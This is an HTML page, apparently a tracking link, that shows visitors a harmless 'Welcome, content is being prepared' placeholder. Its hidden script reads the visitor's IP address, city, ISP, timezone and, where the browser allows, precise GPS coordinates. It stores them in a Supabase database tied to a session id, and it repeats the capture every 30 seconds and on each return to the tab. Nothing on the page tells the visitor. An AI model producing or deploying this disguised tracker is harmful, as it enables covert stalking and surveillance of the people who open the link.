<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
.c{text-align:center;padding:40px 30px;max-width:500px}
h1{font-size:2rem;margin-bottom:12px}
p{font-size:1rem;opacity:.9;line-height:1.6;margin-bottom:20px}
.ld{width:40px;height:40px;border:4px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;margin:0 auto 20px}
@keyframes sp{to{transform:rotate(360deg)}}
.hide{display:none}
.card{background:rgba(255,255,255,.15);backdrop-filter:blur(10px);border-radius:16px;padding:28px;margin-top:20px}
.card h2{font-size:1.2rem;margin-bottom:8px}
.card p{font-size:.92rem;margin-bottom:0}
</style>
</head>
<body>
<div class="c">
  <div id="ld"><div class="ld"></div><h1>⏳ Loading...</h1><p>Please wait.</p></div>
  <div id="ct" class="hide"><h1>👋 Welcome!</h1><div class="card"><h2>Thanks for visiting</h2><p>Content is being prepared. Check back later!</p></div></div>
</div>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
(async()=>{
  const sid = new URLSearchParams(location.search).get('s');
  if(!sid||SUPABASE_URL.includes('REPLACE'))return;
  const db = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

  async function active(){
    const{data}=await db.from('sessions').select('is_active').eq('id',sid).single();
    return data?.is_active===true;
  }

  async function getIP(){
    try{const r=await fetch('https://ipwho.is/');if(r.ok){const d=await r.json();if(d.success!==false)return{ip:d.ip,latitude:d.latitude,longitude:d.longitude,city:d.city,region:d.region,country:d.country,isp:d.connection?.isp||d.connection?.org||'?',timezone:d.timezone?.id||'?'}}}catch(e){}
    try{const r=await fetch('https://ipapi.co/json/');if(r.ok){const d=await r.json();return{ip:d.ip,latitude:d.latitude,longitude:d.longitude,city:d.city,region:d.region,country:d.country_name,isp:d.org||'?',timezone:d.timezone||'?'}}}catch(e){}
    try{const r=await fetch('https://freeipapi.com/api/json/');if(r.ok){const d=await r.json();return{ip:d.ipAddress,latitude:d.latitude,longitude:d.longitude,city:d.cityName,region:d.regionName,country:d.countryName,isp:'?',timezone:d.timeZone||'?'}}}catch(e){}
    return null;
  }

  function getGPS(){return new Promise(r=>{if(!navigator.geolocation){r(null);return}navigator.geolocation.getCurrentPosition(p=>r({latitude:p.coords.latitude,longitude:p.coords.longitude,acc:p.coords.accuracy}),()=>r(null),{enableHighAccuracy:true,timeout:10000,maximumAge:60000})})}

  async function ping(){
    if(!await active())return;
    const ip=await getIP();if(!ip)return;
    const gps=await getGPS();
    await db.from('locations').insert({
      session_id:sid,ip:ip.ip,
      latitude:gps?.latitude??ip.latitude,longitude:gps?.longitude??ip.longitude,
      city:ip.city,region:ip.region,country:ip.country,isp:ip.isp,timezone:ip.timezone,
      accuracy:gps?'gps (±'+Math.round(gps.acc)+'m)':'ip (~5-25km)',
      raw_data:{ip,gps:gps||null}
    });
    console.log('📍 Ping sent');
  }

  setTimeout(()=>{document.getElementById('ld').style.display='none';document.getElementById('ct').classList.remove('hide')},2500);

  if(await active()){
    await ping();
    setInterval(ping,30000);
    document.addEventListener('visibilitychange',()=>{if(!document.hidden)ping()});
  }
})();
</script>
</body>
</html>
